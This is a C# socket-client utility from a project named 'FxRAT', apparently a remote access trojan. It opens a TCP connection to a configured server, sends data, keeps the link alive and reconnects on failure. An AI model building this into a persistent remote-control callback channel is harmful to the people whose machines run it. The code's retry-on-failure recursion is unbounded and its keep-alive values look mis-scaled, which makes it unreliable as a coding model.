using System;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace FxRAT.Utils
{
    public class Connection
    {
        private Socket _clientSocket;
        private readonly IPAddress _serverIp;
        private readonly int _serverPort;
        private bool _connected;

        public Connection(string serverIp, int serverPort)
        {
            _serverIp = IPAddress.Parse(serverIp);
            _serverPort = serverPort;
        }

        public void Connect()
        {
            try
            {
                _clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                _clientSocket.Connect(new IPEndPoint(_serverIp, _serverPort));
                Console.WriteLine("Connected to server.");
                _connected = true;
                ConfigureKeepAlive(_clientSocket);
                StartKeepAliveThread();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error connecting to server: " + ex.Message);
            }
        }

        public void Write(string data)
        {
            try
            {
                if (!_connected)
                {
                    Console.WriteLine("Not connected to server.");
                    return;
                }

                byte[] dataBytes = Encoding.ASCII.GetBytes(data);
                _clientSocket.Send(dataBytes);
                Console.WriteLine("Data sent successfully.");
                Console.WriteLine(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error sending data: " + ex.Message);
                Reconnect();
                Write(data);
            }
        }

        private void ConfigureKeepAlive(Socket socket)
        {
            // Set keep-alive parameters
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.TcpKeepAliveTime, 120000); // 2 minutes
            socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.TcpKeepAliveInterval, 10000); // 10 seconds
        }

        private void Reconnect()
        {
            try
            {
                _clientSocket.Close();
                _connected = false;
                Connect();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Error reconnecting to server: " + ex.Message);
            }
        }

        private void StartKeepAliveThread()
        {
            Thread keepAliveThread = new Thread(() =>
            {
                while (_connected)
                {
                    try
                    {
                        // Send a keep-alive packet (can be an empty message)
                        _clientSocket.Send(Encoding.ASCII.GetBytes("KeepAlive"));
                        Thread.Sleep(5000); // Send keep-alive every 5 seconds
                    }
                    catch (Exception ex)
                    {
                        Console.WriteLine("Error sending keep-alive packet: " + ex.Message);
                        Reconnect();
                        break;
                    }
                }
            });

            keepAliveThread.IsBackground = true;
            keepAliveThread.Start();
        }
    }
}
